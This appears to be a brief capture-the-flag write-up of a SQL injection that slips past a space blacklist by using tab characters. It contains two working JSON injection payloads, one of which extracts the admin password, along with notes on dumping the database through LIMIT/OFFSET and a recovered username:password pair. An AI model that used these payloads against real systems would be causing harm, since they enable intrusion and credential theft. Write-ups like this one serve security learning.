This was a SQL injection which had a blacklist of spaces. In order to bypass this, I used the unicode character for tab

first poc sql injection
```json
{
    "name": "fdsafdsaasdfasdf',\u0009(SELECT\u00091))\u0009RETURNING\u0009id,\u0009password--",
    "passwd":""
}
```
extract admin pw
```json
{
    "name": "12',\u0009(SELECT\u0009password\u0009FROM\u0009users\u0009WHERE\u0009username='admin'))\u0009RETURNING\u0009id,\u0009password--",
    "passwd":""
}
```

start exfilling db using LIMIT and OFFSET

users: ["id", "username", "password", "admin"]
classes: ["id", "name", "open"]
assignments: ["id", "class_id", "name", "text", "grading_binary"]
submissions: ["id", "user_id", "assignment_id", "filename"]
submission_results: ["id", "submission_id", "result", "message"]

look for valid submissions -> match submission id to user_id -> get password and login as that user

username:password
jU9KdEBhtp8Qd5Zt:jU9KdEBhtp8Qd5Zt
